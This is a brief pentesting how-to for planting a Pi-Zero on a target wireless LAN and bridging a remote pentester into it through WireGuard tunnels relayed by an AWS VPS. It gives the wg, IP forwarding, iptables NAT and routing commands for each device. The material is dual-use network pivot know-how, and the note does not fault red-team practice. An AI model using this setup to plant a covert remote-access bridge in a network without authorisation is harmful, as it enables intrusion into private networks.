## Use Pi-Zero (and WireGuard tunneling) to bridge a remote pentester into a Wireless LAN

**Overview:**  
*Pi-Zero connects to Wireless LAN (network of interest) and uses a cellular connection (WireGuard tunnel) to enable remote pentester to access Wireless LAN.*

**IP scheme in this scenario:**  
*Wireless LAN (target of interest) = 192.168.1.0/24  
Target router's LAN IP = 192.168.1.1/24  
Target web server's LAN IP = 192.168.1.202/24*

Below are the manual steps to establish the WireGuard tunnels (as opposed to using WireGuard pre-built configurations). These steps assume you have already installed/compiled WireGuard on the remote pentester's workstation, the AWS VPS and the Pi-Zero.

**AWS VP (WireGuard Client IP: 9.9.9.99/24)**  
```wg set wg0 listen-port 12345 private-key private peer <remote user public key> allowed-ips 9.9.9.1/32 peer <Pi-Zero public key> allowed-ips 9.9.9.2/32,192.168.1.0/24```
(if you are unaware of the Target Wireless LAN's subnet (192.168.1.0/24), you can leave this off for now)

Additional commands to consider:  
```echo 1 > /proc/sys/net/ipv4/ip_forward  
iptables -t nat -I POSTROUTING -o wg0 -j MASQUERADE  
ip route add 192.168.1.0/24 via 9.9.9.2
```

**Remote pentester (WireGuard Client IP: 9.9.9.1/24)**  
```wg set wg0 private-key private peer <AWS VPS public key> endpoint <AWS public IP>:12345 persistent-keepalive 10 allowed-ips 9.9.9.0/24,192.168.1.0/24```
(if you are unaware of the Target Wireless LAN's subnet (192.168.1.0/24), you can leave this off for now)

Additional commands to consider:  
```ip route add 192.168.1.0/24 via 9.9.9.99```

**Pi-Zero (WireGuard Client IP: 9.9.9.2/24)**  
```wg set wg0 private-key private peer <AWS public key> endpoint <AWS public IP>:12345 persistent-keepalive 10 allowed-ips 9.9.9.0/24```

Additional commands to consider:  
```echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -I POSTROUTING -o wlan0 -j MASQUERADE
```

**Successful testing outcomes:**  
1.) Curl, netcat and/or navigate to the target router's homepage (192.168.1.1) from the remote pentester's workstation, as if you were directly connected to the target network.  
2.) Curl, netcat and/or navigate to the target web server hosted on LAN (192.168.1.202) from the remote pentester's workstation, as if you were connected directly to network.
